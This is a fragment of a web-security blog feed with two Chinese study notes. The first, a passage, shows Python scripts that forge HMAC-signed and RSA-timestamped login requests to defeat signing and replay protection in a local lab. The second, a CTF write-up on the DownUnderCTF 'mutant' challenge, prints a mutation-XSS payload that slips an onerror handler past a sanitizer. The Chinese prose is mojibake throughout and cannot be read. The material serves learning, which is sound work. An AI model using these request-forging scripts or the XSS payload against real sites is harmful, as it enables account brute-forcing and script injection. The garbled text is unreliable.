å¯†ï¼Œkeyå’Œivéƒ½ä½¿ç”¨äº†usernameçš„å€¼ï¼Œkeyæ˜¯ 8 ä½ï¼Œ</span><br><span class="line">å¦‚æœusernameä¸æ»¡ 8 ä½åˆ™ç”¨ 6 è¡¥æ»¡ï¼Œivæ˜¯ 8 ä½ï¼Œ9999 + usernameçš„å‰å››ä½ï¼Œè¾“å…¥admi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keyï¼šadmin666</span><br><span class="line">ivï¼š9999admi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105195228696.png" alt="image-20251105195228696"></p><p><img src="/../images/image-20251105195328293.png" alt="image-20251105195328293"></p><h2 id="æ˜æ–‡åŠ ç­¾"><a href="#æ˜æ–‡åŠ ç­¾" class="headerlink" title="æ˜æ–‡åŠ ç­¾"></a>æ˜æ–‡åŠ ç­¾</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sendDataWithNonce</span>(<span class="params">url</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">.<span class="property">value</span>;</span><br><span class="line"><span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">.<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="title class_">Math</span>.<span class="title function_">random</span>()</span><br><span class="line">.<span class="title function_">toString</span>(<span class="number">36</span>)</span><br><span class="line">.<span class="title function_">substring</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">const</span> timestamp = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secretKey = <span class="string">&quot;be56e057f20f883e&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dataToSign = username + password + nonce + timestamp;</span><br><span class="line"><span class="keyword">const</span> signature = <span class="title class_">CryptoJS</span>.<span class="title class_">HmacSHA256</span>(dataToSign, secretKey)</span><br><span class="line">.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(url, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line"><span class="attr">headers</span>: &#123;</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line"><span class="attr">username</span>: username,</span><br><span class="line"><span class="attr">password</span>: password,</span><br><span class="line"><span class="attr">nonce</span>: nonce,</span><br><span class="line"><span class="attr">timestamp</span>: timestamp,</span><br><span class="line"><span class="attr">signature</span>: signature</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;success.html&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">alert</span>(data.<span class="property">error</span> || <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;è¯·æ±‚é”™è¯¯:&quot;</span>, error));</span><br><span class="line"></span><br><span class="line"><span class="title function_">closeModal</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’ä»¶bugå¯†é’¥æœ‰è‹±æ–‡ä¸è¡Œï¼Œç­‰1.08å°±å¥½äº†å§åº”è¯¥ï¼Œåº·åº·butt3rf1yå§å§çš„è„šæœ¬</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105201526093-1762351835148-1.png" alt="image-20251105201526093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/enjs/encrypt/signdata.php&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;be56e057f20f883e&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_nonce</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">username, password, nonce, timestamp, key</span>):</span><br><span class="line">    data_to_sign = username + password + nonce + <span class="built_in">str</span>(timestamp)</span><br><span class="line">    <span class="keyword">return</span> hmac.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), data_to_sign.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha256).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_signed_request</span>():</span><br><span class="line">    nonce = generate_nonce()</span><br><span class="line">    timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line">    signature = generate_signature(username, password, nonce, timestamp, secret_key)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://127.0.0.1/enjs/encrypt/signdata.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: timestamp,</span><br><span class="line">        <span class="string">&quot;signature&quot;</span>: signature</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Headers:&quot;</span>)</span><br><span class="line">    pprint.pprint(<span class="built_in">dict</span>(response.headers))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    send_signed_request()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105202408743.png" alt="image-20251105202408743"></p><h2 id="åŠ ç­¾-key-åœ¨æœåŠ¡ç«¯"><a href="#åŠ ç­¾-key-åœ¨æœåŠ¡ç«¯" class="headerlink" title="åŠ ç­¾ key åœ¨æœåŠ¡ç«¯"></a>åŠ ç­¾ key åœ¨æœåŠ¡ç«¯</h2><p><img src="/../images/image-20251105202522550.png" alt="image-20251105202522550"></p><p><img src="/../images/image-20251105202616573.png" alt="image-20251105202616573"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æœåŠ¡ç«¯è·å–ç­¾åä¹‹åå’Œusernameï¼Œpasswordï¼Œtimestamp è¿›è¡Œç­¾åå†ç™»å½•</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105202755670.png" alt="image-20251105202755670"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºåŠ è§£å¯†éƒ½åœ¨æœåŠ¡å™¨ç«¯å®Œæˆæ‰€ä»¥æ— æ³•ä¼ªé€ </span><br><span class="line">å¦‚æœè¦åšå¯†ç çˆ†ç ´æ“ä½œçš„è¯ï¼Œå†™ä¸ªè„šæœ¬ï¼Œå°†ç¬¬ä¸€ä¸ªåŒ…è·å¾—çš„signï¼Œå†å»çˆ†ç ´åº”è¯¥ä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure><h2 id="ç¦æ­¢é‡æ”¾"><a href="#ç¦æ­¢é‡æ”¾" class="headerlink" title="ç¦æ­¢é‡æ”¾"></a>ç¦æ­¢é‡æ”¾</h2><p><img src="/../images/image-20251105202955511.png" alt="image-20251105202955511"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateRequestData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> publicKey = <span class="string">`-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span></span><br><span class="line"><span class="string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span></span><br><span class="line"><span class="string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span></span><br><span class="line"><span class="string">ocDbsNeCwNpRxwjIdQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">rsaEncrypt</span>(<span class="params">data, publicKey</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> jsEncrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); </span><br><span class="line">        jsEncrypt.<span class="title function_">setPublicKey</span>(publicKey);</span><br><span class="line">        <span class="keyword">const</span> encrypted = jsEncrypt.<span class="title function_">encrypt</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="keyword">if</span> (!encrypted) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;RSA encryption failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encrypt the timestamp</span></span><br><span class="line">    <span class="keyword">let</span> encryptedTimestamp;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        encryptedTimestamp = <span class="title function_">rsaEncrypt</span>(timestamp, publicKey);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Encryption error:&quot;</span>, error);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> dataToSend = &#123;</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">password</span>: password,</span><br><span class="line">        <span class="attr">random</span>: encryptedTimestamp <span class="comment">// Replace timestamp with encrypted version</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataToSend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105203512246.png" alt="image-20251105203512246"></p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/enjs/encrypt/norepeater.php&quot;</span></span><br><span class="line">public_key = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span></span><br><span class="line"><span class="string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span></span><br><span class="line"><span class="string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span></span><br><span class="line"><span class="string">ocDbsNeCwNpRxwjIdQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">data, public_key</span>):</span><br><span class="line">    key = RSA.import_key(public_key)</span><br><span class="line">    cipher = PKCS1_v1_5.new(key)</span><br><span class="line">    encrypted_data = cipher.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>():</span><br><span class="line">    ts = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    encrypted_ts = rsa_encrypt(ts, public_key)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=snuhsl9mkun6ftjd3481d3g5nd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://127.0.0.1/enjs/encrypt/norepeater.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">        <span class="string">&quot;random&quot;</span>: encrypted_ts</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, headers=headers, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Headers:&quot;</span>)</span><br><span class="line">    pprint.pprint(<span class="built_in">dict</span>(response.headers))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    send_request()</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/b15c661df6814449eea53b149ea2e999.png" alt="b15c661df6814449eea53b149ea2e999"></p>]]></content>
      
      
      <categories>
          
          <category> é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹xss</title>
      <link href="/posts/33318.html"/>
      <url>/posts/33318.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_sun_.empty.å¸ˆå‚…ç»™æˆ‘çœ‹äº†ä¸€é“å›½é™…èµ›easyéš¾åº¦çš„xssé¢˜ç›®ï¼Œå®åœ¨ä¸ä¼šï¼Œäºæ˜¯æ‰“ç®—å¤ç°ä¸€ä¸‹</span><br><span class="line">ç»“æœdockerçš„æ—¶å€™xss-botæ‹‰èµ·å¤ªæ…¢ï¼Œä½¿ç”¨é•œåƒä¹‹åä¿®æ”¹æ–‡ä»¶åˆå‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥å°±å•çº¯çš„ç™½ç›’å®¡è®¡ä¸€ä¸‹è¿™é“é¢˜ï¼Œ&quot;æ„å› &quot;ä¸€ä¸‹</span><br><span class="line">è¿™é¢˜çš„ç‚¹æ˜¯è§£æå™¨çš„æ ‡ç­¾&quot;ç©ºé—´&quot;é—®é¢˜,ä»¥åŠå¸¸è§çš„é¡ºåºéªŒè¯é”™è¯¯ã€ä»£ç å®¡è®¡ä¸­å¸¸å‡ºç°çš„å‚æ•°å¯æ§é—®é¢˜ã€‘</span><br><span class="line"></span><br><span class="line">ä¸€å¼€å§‹çœ‹åˆ°è¿™é“é¢˜çš„æ—¶å€™è¿˜åœ¨æƒ³æ˜¯ä¸æ˜¯è‡ªå·±çš„xssçŸ¥è¯†ç‚¹ç¼ºå¤±å¾ˆå¤§ï¼Œäºæ˜¯æ‰“ç®—æ•´ç†å¤ç°ä¸€æ‰‹å…³äºxssçš„åŸºç¡€çŸ¥è¯†ï¼Œæ–¹ä¾¿ä»¥åè§åˆ°å¥½ç¿»ç¿»ç¬”è®°</span><br><span class="line">ç»“æœæ˜¯æ ‡ç­¾é—®é¢˜ã€æ›´å¤§çš„ç›²åŒºï¼Œæ‰€ä»¥åé¢ä¸æ¶‰åŠcssä¹‹ç±»çš„xssï¼ŒxssåŸå‹é“¾æ±¡æŸ“ï¼Œdomå±æ€§çš„æ·±å±‚æ¬¡ç ”ç©¶ï¼Œé‡åˆ°äº†å†è¯´ï¼Œå˜»å˜»ã€‘</span><br><span class="line">æ„Ÿè°¢sunå¸ˆå‚…çš„æ‹·æ‰“ï¼Œè®©æˆ‘åˆåˆåˆæ¶¨è§è¯†äº†</span><br><span class="line"></span><br><span class="line">è¿™ç¯‡æ–‡ç« ä¸ªäººæ„Ÿè§‰è¿˜æ˜¯å¾ˆæ°´çš„ï¼Œå› ä¸ºæ„Ÿè§‰ä¸œè¥¿è¿˜æ˜¯ç‰¹åˆ«å¤šï¼Œç ”ç©¶ä¸æ·±</span><br><span class="line">æœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹å¸Œæœ›è·Ÿå¸ˆå‚…ä»¬äº¤æµï¼Œå¤§å¸ˆå‚…å¿«æ¥æ‹·æ‰“æˆ‘ï¼Œæˆ‘ä¸€å®šä¼šåŠªåŠ›çš„ï¼Œå‘œå‘œå‘œã€‚</span><br></pre></td></tr></table></figure><h1 id="mutant"><a href="#mutant" class="headerlink" title="mutant"></a>mutant</h1><p><a href="https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/">https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/</a></p><p><img src="/../images/image-20251020163628329.png" alt="image-20251020163628329"></p><p>ä½¿ç”¨äº†&lt;template&gt;æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;æ˜¯ HTML5 å¼•å…¥çš„ç‰¹æ®Šå…ƒç´ ï¼Œå®ƒçš„å†…å®¹è¢«è§†ä¸º&quot;æƒ°æ€§&quot;çš„ï¼š</span><br><span class="line">ä¸ä¼šç«‹å³æ¸²æŸ“</span><br><span class="line">ä¸ä¼šæ‰§è¡Œè„šæœ¬</span><br><span class="line">ä¸ä¼šåŠ è½½èµ„æº</span><br><span class="line">ä¿æŒå†…å®¹éš”ç¦»ï¼Œç›´åˆ°è¢«æ¿€æ´»ä½¿ç”¨</span><br></pre></td></tr></table></figure><p>if (n.attributes)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç§»é™¤æ‰€æœ‰å±æ€§</span><br></pre></td></tr></table></figure><p>if (n.nodeName !&#x3D;&#x3D; â€œ#document-fragmentâ€ &amp;&amp;       (n.nodeName.length &#x3D;&#x3D;&#x3D; 6 || n.nodeName.length &#x3D;&#x3D;&#x3D; 8))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ é™¤ç‰¹å®šé•¿åº¦æ ‡ç­¾åçš„å…ƒç´ </span><br></pre></td></tr></table></figure><p>for (let i &#x3D; n.children.length - 1; i &gt;&#x3D; 0; iâ€“)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ·±åº¦éå†æ•´ä¸ªDOMæ ‘</span><br></pre></td></tr></table></figure><p>payloadè§£æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;math&gt;</span><br><span class="line">    &lt;mtext&gt;&lt;/form&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;malignmark&gt;</span><br><span class="line">    &lt;style&gt;&lt;/math&gt;</span><br><span class="line">&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><ol><li><p>è§£æå™¨é‡åˆ°<code>&lt;form&gt;</code>å¼€å§‹æ ‡ç­¾ç„¶åæ˜¯<code>&lt;math&gt;</code>æ ‡ç­¾ï¼ˆMathMLå‘½åç©ºé—´ï¼‰æ¥ç€æ˜¯<code>&lt;mtext&gt;</code>æ ‡ç­¾ã€è¿™é‡Œæ˜¯mathmlçš„å…ƒç´ ã€‘</p></li><li><p><code>&lt;/form&gt;</code>ï¼šåœ¨MathMLå‘½åç©ºé—´å†…é‡åˆ°<code>&lt;/form&gt;</code>ã€htmlå…ƒç´ ã€‘ä¼šè§¦å‘ç‰¹æ®Šè¡Œä¸ºè§£æå™¨ä¼šâ€å…³é—­â€å½“å‰è¡¨å•ï¼Œè§£æå™¨å¯¹å…¶è¿›è¡Œå¤„ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 